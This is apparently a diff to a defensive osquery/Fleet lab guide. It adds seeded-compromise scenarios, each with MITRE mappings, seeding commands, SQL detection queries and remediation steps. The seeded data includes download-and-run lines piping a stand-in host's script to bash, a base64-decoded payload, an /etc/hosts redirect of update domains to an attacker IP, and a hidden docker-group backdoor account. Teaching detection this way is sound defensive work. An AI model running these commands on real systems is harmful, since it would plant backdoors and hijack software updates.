@@ -35,6 +35,11 @@ the demo teaches breadth:
 | 8 | NOPASSWD sudoers + weak /etc/shadow | T1548.003, T1222.002 | `sudoers` (+ `file`) |
 | 9 | Known-vulnerable software (CVE) | — | `python_packages` |
 | 10 | Reverse-shell / C2 beacon | T1571, T1059.004 | `process_open_sockets` |
+| 11 | LD_PRELOAD userland rootkit | T1574.006 | `process_envs` |
+| 12 | Attacker traces in shell history | T1552.003, T1070.003 | `shell_history` |
+| 13 | Fileless: deleted binary still running | T1070.004 | `processes` (`(deleted)`) |
+| 14 | `/etc/hosts` hijack of trusted domains | T1565.001, T1556 | `etc_hosts` |
+| 15 | Hidden privilege via the `docker` group | T1098, T1548 | `user_groups` + `groups` |
 
 ---
 
@@ -363,8 +368,10 @@ pip3 install --break-system-packages 'Django==2.2.0' \
 ```
 
 **Detection query.** `python_packages` inventories installed Python distributions.
-Note `pip` normalizes the version `2.2.0` → `2.2` (the `dist-info` is
-`Django-2.2.dist-info`), so match the `2.2` line with `LIKE '2.2%'` (no dot):
+The reported version depends on how the fixture was created: a real `pip install`
+normalizes `2.2.0` → `2.2` (`dist-info` = `Django-2.2.dist-info`), while the
+**offline fallback** writes an explicit `Version: 2.2.0` (`dist-info` =
+`Django-2.2.0.dist-info`). Match both with the prefix `LIKE '2.2%'`:
 ```sql
 SELECT name, version, path
 FROM python_packages
@@ -378,9 +385,9 @@ WHERE name = 'Django' AND version LIKE '2.2%';
 > but `SELECT name, version FROM deb_packages WHERE name = 'sudo';` is the
 > equivalent OS-package query.
 
-**Expected result.** One row: `Django`, version `2.2` (pip-normalized from
-`2.2.0`), with its site-packages path. In Fleet's Vulnerabilities view it resolves
-to CVE-2020-7471 et al.
+**Expected result.** One row: `Django`, version `2.2` (pip path) or `2.2.0`
+(offline-fallback path), with its site-packages path. In Fleet's Vulnerabilities
+view it resolves to CVE-2020-7471 et al.
 
 **Remediation.** Upgrade Django to a supported, patched release; track SBOM /
 dependencies and act on Fleet's Vulnerabilities dashboard.
@@ -431,9 +438,241 @@ outbound destinations, and alert on long-lived connections to unusual ports.
 
 ---
 
+## 11. LD_PRELOAD userland rootkit / library injection
+
+**Real-world framing.** *Hijack Execution Flow: Dynamic Linker Hijacking*
+(**MITRE ATT&CK [T1574.006](https://attack.mitre.org/techniques/T1574/006/)**).
+The dynamic linker honours `LD_PRELOAD` — a list of shared objects loaded
+**before** every other library. Attackers preload a malicious `.so` to hook libc
+calls (`readdir`, `open`, `accept`), hiding files, processes and network sockets,
+or skimming credentials. Set persistently in `/etc/ld.so.preload` it hooks *every*
+new process on the host; set per-process it hides in that process's environment.
+
+**The vulnerability.** A long-lived process runs with
+`LD_PRELOAD=/usr/local/lib/libx86_64.so` in its environment — an injected library
+hook. (In the lab the `.so` is an empty benign marker so nothing is actually
+hooked; the detectable artefact is the injected env var itself.)
+
+**How it's seeded.**
+```bash
+: > /usr/local/lib/libx86_64.so                          # marker (real: malicious .so)
+env LD_PRELOAD=/usr/local/lib/libx86_64.so python3 -c 'import time
+while True: time.sleep(3600)' &                          # victim carries the env var
+```
+
+**Detection query.** `process_envs` exposes each process's environment. Any
+process carrying a linker-injection variable (`LD_PRELOAD`, `LD_LIBRARY_PATH`,
+`LD_AUDIT`) is worth explaining — legitimate ones are rare and well-known:
+```sql
+SELECT pe.pid, p.name, pe.key, pe.value
+FROM process_envs pe
+JOIN processes p ON pe.pid = p.pid
+WHERE pe.key IN ('LD_PRELOAD', 'LD_LIBRARY_PATH', 'LD_AUDIT')
+  AND pe.value != '';
+```
+Companion query — the host-wide persistence file (should not exist on a clean
+box):
+```sql
+SELECT path, size, mtime FROM file WHERE path = '/etc/ld.so.preload';
+```
+
+**Expected result.** One row: a `python3` process with `key = 'LD_PRELOAD'` and
+`value = /usr/local/lib/libx86_64.so`. `process_envs` reads `/proc/<pid>/environ`,
+so run osquery as root.
+
+**Remediation.** Kill the process; remove any rogue `.so` and delete
+`/etc/ld.so.preload` if present; baseline which processes may legitimately set
+`LD_*`, and alert on new preload libraries.
+
+---
+
+## 12. Attacker traces in shell history
+
+**Real-world framing.** *Unsecured Credentials: Bash History*
+(**[T1552.003](https://attack.mitre.org/techniques/T1552/003/)**) and
+*Indicator Removal: Clear Command History*
+(**[T1070.003](https://attack.mitre.org/techniques/T1070/003/)**). Hands-on-keyboard
+intrusions leave a trail in `~/.bash_history`: download-and-run commands, decoded
+payloads, and often a `history -c` at the end — which clears the *live* shell but
+not the on-disk file already flushed.
+
+**The vulnerability.** `/root/.bash_history` contains attacker commands — a
+`wget` of a "miner", a `base64 -d | bash` payload, a `curl … | bash`, and a
+trailing `history -c`.
+
+**How it's seeded.** Suspicious lines are appended to `/root/.bash_history`
+(e.g. `wget http://198.51.100.13/miner …`, `echo <b64> | base64 -d | bash`,
+`curl -fsSL http://198.51.100.13/b.sh | bash`, `history -c`).
+
+**Detection query.** The `shell_history` table parses users' history files (its
+columns are `uid`, `time`, `command`, `history_file`). By default it reads only
+the *current* user's history, so **JOIN `users`** to sweep every account and
+attribute each command. Hunt for downloader-into-shell, decoded payloads and
+history-clearing:
+```sql
+SELECT u.username, sh.command
+FROM shell_history sh
+JOIN users u ON sh.uid = u.uid
+WHERE sh.command LIKE '%curl%| bash%'
+   OR sh.command LIKE '%wget %'
+   OR sh.command LIKE '%base64 -d%'
+   OR sh.command LIKE '%history -c%'
+   OR sh.command LIKE '%/dev/tcp/%';
+```
+
+**Expected result.** Several rows for `root`, including the `base64 -d | bash`
+payload and the `history -c` clean-up attempt.
+
+**Remediation.** Treat the host as compromised and investigate; ship shell
+history to a central log (append-only) so `history -c` can't erase evidence, and
+alert on decode-and-execute patterns.
+
+---
+
+## 13. Fileless: a deleted binary still running
+
+**Real-world framing.** *Indicator Removal: File Deletion*
+(**[T1070.004](https://attack.mitre.org/techniques/T1070/004/)**). Malware that
+copies itself, launches, then `rm`s the on-disk file leaves nothing for a
+file-based scan — yet the process keeps running from the now-unlinked inode. The
+kernel still resolves `/proc/<pid>/exe` (readlink appends `" (deleted)"`), and
+osquery flags the same fact with `processes.on_disk = 0`.
+
+**The vulnerability.** A process runs from `/tmp/.x11-unix-cache` (a
+system-looking name in a world-writable directory) whose backing file has been
+deleted — a classic "fileless" foothold. (We stage in `/tmp` rather than
+`/dev/shm` because the latter is frequently mounted `noexec`; the finding is the
+deleted binary, not the directory.)
+
+**How it's seeded.**
+```bash
+cp /bin/sleep /tmp/.x11-unix-cache
+/tmp/.x11-unix-cache 86400 &
+rm -f /tmp/.x11-unix-cache        # file gone; the PID lives on
+```
+
+**Detection query.** `processes.on_disk` is `0` when a running process's
+executable no longer exists on disk (unlinked). `path` still shows where it lived:
+```sql
+SELECT pid, name, path, cmdline, uid
+FROM processes
+WHERE on_disk = 0 AND path != '';
+```
+> **Note.** osquery reports the *original* path in `path` (it does **not** keep
+> the readlink `" (deleted)"` suffix) — the deletion is signalled by `on_disk`.
+> `on_disk = 0` also flags a process whose binary was legitimately replaced
+> (e.g. mid-upgrade), so treat it as a lead to triage, not proof of malice.
+
+**Expected result.** One row: the running process whose backing file
+(`/tmp/.x11-unix-cache`) has been deleted, with `on_disk = 0`.
+
+**Remediation.** Kill the process (capture `/proc/<pid>/exe` first for forensics —
+the inode is still readable); mount `/dev/shm` and `/tmp` `noexec`; alert on
+execution from memory-backed filesystems and on deleted-executable processes.
+
+---
+
+## 14. `/etc/hosts` hijack of trusted domains
+
+**Real-world framing.** *Data Manipulation: Stored Data Manipulation* /
+*Modify Authentication Process* (**[T1565.001](https://attack.mitre.org/techniques/T1565/001/)**,
+**[T1556](https://attack.mitre.org/techniques/T1556/)**). Because `/etc/hosts`
+is consulted **before** DNS, an attacker who pins `security.ubuntu.com` (or an
+internal update server) to their own IP silently redirects package updates and
+telemetry — serving fake patches or capturing data — with no DNS query to detect.
+
+**The vulnerability.** `/etc/hosts` maps update/security domains
+(`security.ubuntu.com`, `archive.ubuntu.com`, `deb.debian.org`) to an
+attacker IP `45.137.21.53`.
+
+**How it's seeded.**
+```bash
+cat >> /etc/hosts <<'EOF'
+45.137.21.53  security.ubuntu.com
+45.137.21.53  archive.ubuntu.com
+45.137.21.53  deb.debian.org
+EOF
+```
+
+**Detection query.** The `etc_hosts` table parses `/etc/hosts`. A clean host maps
+only loopback and its own name; a public FQDN pinned to a routable address is
+suspicious. This form excludes loopback and the container's own (non-FQDN)
+entries:
+```sql
+SELECT address, hostnames
+FROM etc_hosts
+WHERE address NOT LIKE '127.%'
+  AND address NOT LIKE '::%'
+  AND address NOT LIKE 'fe00%'
+  AND address NOT LIKE 'ff0%'
+  AND (hostnames LIKE '%.com%' OR hostnames LIKE '%.org%' OR hostnames LIKE '%.net%');
+```
+
+**Expected result.** Rows mapping the update/security FQDNs to `45.137.21.53`.
+
+**Remediation.** Remove the rogue lines; keep `/etc/hosts` minimal and
+file-integrity-monitored, and alert on any public FQDN pinned to a non-approved
+address.
+
+---
+
+## 15. Hidden privilege via the `docker` group
+
+**Real-world framing.** *Account Manipulation*
+(**[T1098](https://attack.mitre.org/techniques/T1098/)**) plus *Abuse Elevation
+Control Mechanism* (**[T1548](https://attack.mitre.org/techniques/T1548/)**).
+Membership in the `docker` group is **root-equivalent**: any member can
+`docker run -v /:/host …` and read or write the entire host filesystem. The same
+holds for `sudo`/`wheel`, `lxd`, `disk` and `shadow`. Slipping a backdoor account
+into one of these groups is a stealthy privilege stash that hides in plain sight —
+the account itself looks unprivileged.
+
+**The vulnerability.** A low-privileged-looking account `svcagent` (uid ≥ 1000,
+ordinary shell) is a member of the `docker` group — silent host root.
+
+**How it's seeded.**
+```bash
+useradd -m -s /bin/bash svcagent
+groupadd docker 2>/dev/null || true
+usermod -aG docker svcagent
+```
+
+**Detection query.** Join `user_groups` to `users` and `groups` to list members
+of root-equivalent groups that a clean host leaves empty (`docker`, `lxd`,
+`disk`, `shadow`):
+```sql
+SELECT u.username, u.uid, g.groupname
+FROM user_groups ug
+JOIN users u  ON ug.uid = u.uid
+JOIN groups g ON ug.gid = g.gid
+WHERE g.groupname IN ('docker', 'lxd', 'disk', 'shadow')
+  AND u.username != 'root';
+```
+> **Also review `sudo`/`wheel`/`adm`** — those grant admin too, but a normal host
+> *legitimately* has your administrator in them (e.g. the default `ubuntu`
+> account), so listing them isn't an anomaly by itself. Swap the group list above
+> to `('sudo', 'wheel', 'adm')` and reconcile every member against your known-good
+> admin roster; the query kept for the automated sweep uses the groups that
+> should be **empty**, so any row is a finding.
+
+**Expected result.** One row: `svcagent` in the `docker` group. Every returned
+member should map to a known administrator — anyone else is the finding.
+
+**Remediation.** `gpasswd -d svcagent docker` (and delete the account if
+unrecognised); review membership of every root-equivalent group, and alert on
+additions to them.
+
+---
+
 ## Running the whole sweep
 
 Paste any query above into **Fleet → Queries → Live query**, target the seeded
-host, and **Run**. A quick triage order for an audit: 2 → 1 → 8 (privilege &
-accounts) → 4 → 3 → 5 (persistence) → 6 → 10 (network) → 7 (execution) → 9
-(patching). Empty result = clean for that check; any rows = investigate.
+host, and **Run**. A quick triage order for an audit: 2 → 1 → 8 → 15 (privilege &
+accounts) → 4 → 3 → 5 → 14 (persistence & config) → 11 (injection) → 6 → 10
+(network) → 7 → 13 (execution) → 12 (forensics) → 9 (patching). Empty result =
+clean for that check; any rows = investigate.
+
+> **Fleet-wide hunt.** The lab also boots several **clean** agents. Run any query
+> above with **no host filter** (target *all hosts*): only the seeded `vuln-agent`
+> lights up while the clean hosts return nothing — exactly how you'd sweep a real
+> fleet and let the compromised needle surface from the haystack.
